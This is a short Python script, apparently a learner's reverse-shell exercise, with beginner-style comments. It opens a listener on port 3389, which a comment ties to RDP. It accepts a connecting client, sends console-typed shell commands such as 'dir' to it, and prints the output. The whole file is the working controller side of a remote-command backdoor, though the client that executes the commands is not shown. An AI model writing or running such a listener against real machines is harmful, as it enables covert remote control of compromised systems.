```python

import socket 
import sys # to use cmd inside python

# 1- CREATE A SOCKET TO CONNECT THE TWO COMPUTERS
def create_socket():
    # creating a socket in practice sometimes does not happen and an error pops up instead
    # to avoide this we enclose the current paragraph in a try except code
    try:
        global host # global means you can access parameters even outside of the function
        global port
        global s
        host = ""
        port = 3389 #9999 maybe shall be 3389 because of RDP
        s = socket.socket() #create a socket
    
    except socket.error as msg:
        print("socket creation error:" + str(msg))

# 2-BIND THE SOCKET TO HOST AND PORT
def bind_socket():
    try:
        #NOTE: global variables in python shall be declared again when needed to be used
        global host # global means you can access parameters even outside of the function
        global port
        global s
        
        print("Binding the port: " + str(port)) # note that port is integer -> str()
        
        s.bind((host,port))
        s.listen(5) # 3-LISTEN FOR CONNECTION
    
    except socket.error as msg:
        print("socket binding error:" + str(msg) + "\n" + "Retrying...")
        bind_socket()
             
# 4-ACCEPT THE CONNECTION (establishing a connection with the client while socket is listening!!!)
def socket_accept():
    conn, address = s.accept()
    # 5-PRINT IP:PORT OF THE CLIENT
    print("Connection ahas been established |" + " IP " + address[0] + " | Port" + str(address[1]))
    
    send_commands(conn)
    
    conn.close() # 7-CLOSE CONNECTION


# 6-SEND COMMANDS TO THE CLIENT
def send_commands(conn):
#     HERE WE NEED A METHODE TO KEEP THE CONNECTION OPEN BECAUSE RIGHT AFTER THE send_commands(conn)
#     there comes the close connection. to avoide this we make an infinite while loop. This makes it
#     possible to send more than one command.
    while True:
        cmd = input() #only from console
        if cmd == 'quit':
            conn.close() # close connection
            s.close()    # close socket
            sys.exit()   # close the command prompt
            
        #please note that when you send a message from one computer to another it is shall be sent as 
        #bytes not a as string. Here we want to send a command like "dir" or "cls". So we need to 
        # encode it first by str.encode().
        
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),'utf-8') #1024 is the chunk size of the recieving bytes
            # and it will make it as utf-8 which enables str to a readable format.
            print(client_response, end = "") # end ="" is to bring the cursur back to the next line which
            # is ready for the next command.
            
def main():
    create_socket()
    bind_socket()
    socket_accept()
    #send commands() is already inside the accept function
    
main()
    



        
```
